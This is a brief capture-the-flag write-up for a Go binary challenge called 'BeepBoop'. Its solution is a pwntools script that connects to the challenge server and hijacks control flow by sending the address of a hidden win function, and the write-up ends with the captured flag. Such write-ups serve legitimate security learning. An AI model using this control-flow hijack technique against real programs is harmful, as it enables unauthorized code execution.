# BeepBoop

Solved by: @OS1R1S

## Question:
A friend of mine really loves beeps and boops. Since both are equally amazing, he even built a converter to convert them into each other. To develop his programming skillz, he used Go because it’s fast and safe. But as I tried it out, something seems off!

## Solution:

```
from pwn import *

file = ELF("./beepboop")
context.binary = file
p = remote("10.71.15.222", 1337)

win = file.symbols["main.sheepshoop"]

def asd():
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"How many: ", b"10")
    for i in range(9):
        p.recvuntil(b"> ")
        p.sendline(b"0")
    p.sendline(str(win).encode())
    full_output=p.recvall(timeout=3)
    print(full_output.decode(errors="replace"))
asd()
```

**Flag:** `PP{golang-unsafe-b33pb00p}`
